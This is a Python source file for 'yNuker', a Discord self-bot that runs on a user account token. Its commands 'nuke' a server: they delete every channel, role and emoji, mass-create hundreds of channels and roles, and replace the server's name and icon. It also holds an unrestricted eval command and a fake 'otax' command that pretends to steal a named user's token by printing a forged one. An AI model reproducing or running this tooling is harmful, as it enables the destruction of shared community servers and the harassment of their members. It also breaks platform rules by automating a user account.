"""MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""


import os
import asyncio
import discord
from discord.ext import commands
from os import name as os_name, system
from colorama import init, Fore
from discord.ext.commands import CommandNotFound
import os 
import json
import sys
import time
import random, string
import asyncio
import requests
import inspect
import base64
TITLE = "yNuker"
VERSION = "0.3"


config = json.load(open("config.json", "r"))
clear = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

tips = ["This bot is not case sensitive", "I am not responsible for what happens to your account.", "idk what to write", "https://github.com/YeetDisDdue"]
clear()
loading = f'''
{Fore.LIGHTCYAN_EX}
                                   ██╗      █████╗  █████  ██████╗ ██╗███╗  ██╗░██████╗
                                   ██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗ ██║██╔════╝
                                   ██║     ██║  ██║███████║██║  ██║██║██╔██╗██║██║   ██╗
                                   ██║     ██║  ██║██╔══██║██║  ██║██║██║╚████║██   ╚██╗
                                   ███████╗╚█████╔╝██║  ██║██████╔╝██║██║ ╚███║╚██████╔╝██╗██╗██╗
                                   ╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝╚═╝╚═╝
'''

def banner():
    sys.stdout.buffer.write(f'''\
{Fore.LIGHTRED_EX}
                                ██╗   ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗██████╗
                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗   Version: {Fore.WHITE}{VERSION}{Fore.LIGHTRED_EX}
                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗  ██████╔╝      Made by: {Fore.WHITE}YeetDisDude#0001{Fore.LIGHTRED_EX}
                                  ╚██╔╝  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                                   ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
                                   ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
'''.encode('utf8'))
token = config["token"]
prefix = config["prefix"]
everyoneMsg = config["everyoneMsg"]
chName = config["chName"]
roleName = config["roleName"]
vcName = config["vcName"]
ghostpingmsg = config["ghostpingmsg"]
catName = config["catName"]
serverName = config["serverName"]
webhookName = config["webhookName"]
#non json config
icon = requests.get("https://cdn.discordapp.com/emojis/914075850998173706.png?size=160").content

clear()
randomtips = random.choice(tips)
print(loading)
print(f"                                   random message: {randomtips}")


client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, help_command=None)

@client.event
async def on_ready():
    print("                                                      Finished loading.")
    time.sleep(1)
    clear()
    banner()
    print(f'                                                {Fore.RED}yNuker {Fore.WHITE}ready{Fore.LIGHTRED_EX}.')
    print(f'                                 {Fore.LIGHTRED_EX}Hello, {Fore.LIGHTWHITE_EX}{client.user.name}#{client.user.discriminator}! {Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{client.user.id}')
    print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.WHITE}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
    print(f'                                              {Fore.WHITE}{prefix}help {Fore.LIGHTRED_EX}for all commands.')
    print(f'''
                
                                                     {Fore.LIGHTRED_EX}Commands
                                       {prefix}createAll  |   {prefix}delAll  |  {prefix}wip
                                      {prefix}createRole  |  {prefix}createVc | {prefix}guildEdit
                                                       {Fore.RED}{prefix}nuke
                                        
                                   {Fore.LIGHTRED_EX}==================Others=================
                                   
                                       {prefix}ping     |   {prefix}soi   | {prefix}ghostping
                                       {prefix}base  |   {prefix}e
                                       {Fore.WHITE}
                                   ''')                                
cmds = ''

@client.event #ignore command not found error
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        return
    raise error

@client.command()
async def help(ctx):
  await ctx.send(f"""
```yNuker Commmands
  Nuke
    {prefix}createAll - Creates channels and roles
    {prefix}createVc - Creates Voice Chnnels
    {prefix}delAll - Deleted everything in the server
    {prefix}guildEdit: edits the server/guild's name and icon
  Tools
     {prefix}ebase - base64 encode
     {prefix}dbase - base64 decode
     {prefix}e - eval python code
  Others
    {prefix}help - this
    {prefix}ping - your bot ping
    {prefix}soi - sends a random shot on iphone
    {prefix}otax - get anyone's token (dont otax your self )
    ```""")
@client.command()
async def delAll(ctx):
    await ctx.message.delete()

    print('- Deleting channels')
    try:
      tasks = [x.delete() for x in ctx.guild.channels]
      await asyncio.gather(*tasks)   
    except:
      pass

    print('- Deleting roles..')
    try:
      tasks = [x.delete() for x in ctx.guild.roles]
      await asyncio.gather(*tasks)
    except:
      pass

    print('- Deleting emojis')
    try:
      tasks = [x.delete() for x in ctx.guild.emojis]
      await asyncio.gather(*tasks)
    except:
      pass

    print("I have deleted everything.")

async def roles(guild):
  print(f"- Creating roles. {roleName}")
  for x in range(250):
    await guild.create_role(name=f"{roleName}")

async def channels(guild):
  print(f"- Creating channels. {chName}")
  for x in range(500):
    await guild.create_text_channel(f"{chName}")
@client.command()
async def createAll(ctx):
    tasks = [roles(ctx.guild), channels (ctx.guild)]
    await asyncio.gather(*tasks)

@client.command()
async def createVc(ctx):
    await ctx.message.delete()
    print(f"- Creating voice channels. {vcName}")
    for i in range(400):
        guild = ctx.guild
        await ctx.guild.create_text_channel(f"{vcName}")
        print("Success.")

@client.command()
async def guildEdit(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=f"{serverName}")
    await ctx.guild.edit(icon=icon)

@client.command()
async def createRole(ctx):
    await ctx.message.delete()
    print(f"- Creating voice channels. {vcName}")
    for i in range(400):
        guild = ctx.guild
        await ctx.guild.create_text_channel(f"{vcName}")
        print("Success.")
  



#===============others====================

@client.command(name="ping")
async def ping(ctx):
  await ctx.send(f"```Ping\n{round(client.latency * 1000)}ms.```")


@client.command()
async def soi(ctx):
  r = requests.get("https://apiv2.spapi.ga/fun/soi")
  r = r.json()
  video = r["video"]
  await ctx.send(video)

@client.command()
async def ebase(ctx, *, args=None):
  if args is None:
    await ctx.send("```Missing argument.```")
  else:
    encodedBytes = base64.b64encode(args.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    await ctx.send(f"```base64: {encodedStr}```")

@client.command()
async def dbase(ctx, *, args=None):
  if args is None:
    await ctx.send("```Missing argument.```")
  else:
    decoded = base64.b64decode(args).decode('utf-8')
    await ctx.send(f"```base64 decoded: {decoded}```")

@client.command()
async def e(ctx, *, code=None):
    try:
        if code.startswith("await "):
            code = code[6:]
        output = eval(code)
        if inspect.isawaitable(output):
            output = await output
        await ctx.send(f"```ini\n[Input]\n```\n```py\n{code}```\n```ini\n[Output]\n```\n```py\n{output}\n```")
    except Exception as e:
        await ctx.send(f"```ini\n[Error]\n```\n```py\n{e}\n```")


@client.command()
async def otax(ctx, user: discord.User = None):
  tokenstart = ["mfa.", "OTD", "OTM"]
  second = ["grhyq8", "86dxr0", "u3m_i1", "oc83gg", "xrjzmh", "_huysv", "turs9o", "8ot1yz", "xx5h5m"]
  third = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
  if user is None:
    await ctx.send("You need to provide someone to otax, you cant otax your self")
  else:
    message = await ctx.send(f"```Sending Friend Request...```")
    time.sleep(2)
    await message.edit(content="```Got token.```")
    time.sleep(1)
    await message.edit(content="```Declining Friend Request```")
    time.sleep(2)
    await message.edit(content=f"> Otaxed {user.mention}\n`token: {random.choice(tokenstart)}{base64.b64encode(str(user.id).encode('utf-8')).decode('ascii')}.{random.choice(second)}.{third}`")
client.run(token, bot=False)

